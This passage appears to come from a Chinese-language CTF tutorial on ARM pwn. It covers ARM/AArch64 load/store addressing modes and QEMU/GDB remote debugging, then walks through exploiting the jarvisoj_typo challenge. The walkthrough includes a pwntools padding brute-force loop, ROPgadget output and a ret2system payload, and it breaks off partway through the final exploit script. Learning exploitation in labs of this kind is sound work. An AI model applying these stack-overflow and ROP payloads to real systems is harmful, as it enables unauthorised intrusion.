        ldr  r0, [ pc, #12 ]   ; ]`的方式被称为 **寄存器缩放值作偏移寻址** 。 
        str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
    str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2{} ,  {,}`
Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。
Cond：指令执行条件码。
S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。
Rd/Xt：目标寄存器，A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。
Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。
Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。
#####  内存操作指令-load/store
在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。
在ARM-v8指令集中，程序支持以下五种寻址方式：
  1. Base register only (no offset) ：基址寄存器无偏移。形如:`[ base { , #0 } ]`。
  2. Base plus offset：基址寄存器加偏移。形如:`[ base { , #imm } ]`。
  3. Pre-indexed：事先更新寻址，先变化后操作。形如:`[ base , #imm ]!`。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。
  4. Post-indexed：事后更新寻址，先操作后变化。形如:`[ base ] , #imm`。
  5. Literal (PC-relative): PC相对寻址。
常见的Load/Store指令有：
LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH
⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half
Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。
举例：
`LDR X1 , [X2]`——将X2寄存器中的值赋给X1寄存器。
`LDR X1 , [X2] ， #4`——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。
对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。
###  QEMU下的远程调试
以调试方式启动应用程序`qemu-arm -g [port] -L [dynamically linked file] filename`。
这样，程序在启动时将会同时启动gdbserver，程序也会在开头中断等待gdb链接。
新建终端窗口，使用命令`gdb-multiarch filename -q`启动GDB。
进入GDB后，首先使用命令`set architecture [Arch-name]`设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)
然后使用`target remote
localhost:[port]`来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为`gef-remote
localhost:[port]`)
此处需要注意，在远程调试下会发现有一部分命令很难用，比如`s/n`这两个指令，当然官网也给出了不可用的原因是：
> s 相当于其它调试器中的“Step Into (单步跟踪进入)”
>
> n 相当于其它调试器中的“Step Over (单步跟踪)”
>
> **这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。**
而我们可以发现，无论是源程序还是libc都是没有调试信息的。
因此我们需要使用`si/ni`指令来替代它们。
然后是vmmap命令对于远端内存情况的查看貌似也差强人意。(尽管此处的远端也是localhost)
## 0x04 实战演练
###  以jarvisoj_typo为例
####  程序分析
程序为ARM-32-static程序。
可以发现程序的符号表已经被去除，这极大地增加了我们的分析难度。
因此先使用[Rizzo](https://github.com/fireundubh/IDA7-Rizzo)进行符号表修复，首先用IDA加载`/usr/arm-linux-gnueabihf/lib/libc-2.24.so`。
在IDA的file—>Produce file—>Rizzo signature file中使用Rizzo导出符号表文件。
然后加载题目文件，在IDA的file—>Load file—>Rizzo signature
file中使用Rizzo导出加载我们刚才导出的符号表文件，可以看出我们的部分函数符号得到了恢复~
然后我们根据调用的传参规则识别一些函数。
此处推测是`write(1,buf,length)`的调用。
我们发现，我们无法快速的根据反编译结果确定栈变量偏移。
进一步分析发现程序有大量代码没有被反编译！
在进行进一步跟进分析发现此程序在IDA中大量的识别错误，包括但不限于大量的函数尾识别出错，堆栈分析错误，于是放弃静态分析的利用思路。
####  利用思路
考虑使用爆破padding的方式来获取正确的PC控制偏移。
####  padding爆破
    def get_padding_length():
        length = 0
        while True:
            sh = get_sh()
            sh.recvuntil('if you want to quitn')
            sh.send('n')
            sh.recvrepeat(0.3)
            sh.sendline('A' * length + p32(0x8F00))
            try:
                if 'if you want to quitn' in sh.recvrepeat(0.3):
                    return length
                sh.sendline('~')
                log.info('When padding is ' + str(length) + ', Success exit!')
                length = length + 1
                sh.close()
            except:
                log.info('When padding is ' + str(length) + ', Fail exit!')
                length = length + 1
                sh.close()
                pass
####  Ret2addr
首先我们找一个合适的gadget用以劫持PC指针，此处我们选用0x00020904处的gadget。
    error404@error404-PC:/media/psf/Home/Desktop/CTF_question/ARM_dir$ ROPgadget --binary 'typo' --only 'pop|ret'
    Gadgets information
    ============================================================
    0x00008d1c : pop {fp, pc}
    0x00020904 : pop {r0, r4, pc}
    0x00068bec : pop {r1, pc}
    0x00008160 : pop {r3, pc}
    0x0000ab0c : pop {r3, r4, r5, pc}
    0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
    0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}
    0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}
    0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
    0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}
    0x00014a70 : pop {r3, r4, r7, pc}
    0x00008de8 : pop {r4, fp, pc}
    0x000083b0 : pop {r4, pc}
    0x00008eec : pop {r4, r5, fp, pc}
    0x00009284 : pop {r4, r5, pc}
    0x000242e0 : pop {r4, r5, r6, fp, pc}
    0x000095b8 : pop {r4, r5, r6, pc}
    0x000212ec : pop {r4, r5, r6, r7, fp, pc}
    0x000082e8 : pop {r4, r5, r6, r7, pc}
    0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}
    0x00011648 : pop {r4, r5, r6, r7, r8, pc}
    0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}
    0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}
    0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
    0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
    0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}
    0x00023ed4 : pop {r4, r5, r7, pc}
    0x00023dbc : pop {r4, r7, pc}
    0x00014068 : pop {r7, pc}
    Unique gadgets found: 29
我们刚才又顺利的恢复了符号表，获取了system函数的位置。
接下来我们检索程序中的`/bin/sh`字符串。
于是，我们构造`payload='A'*padding + p32(0x00020904) + p32(0x0006c384) +
p32(0x0006c384) + p32(0x000110B4)`
####  Final exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='arm'
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./")
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./typo")
    def get_flag(sh):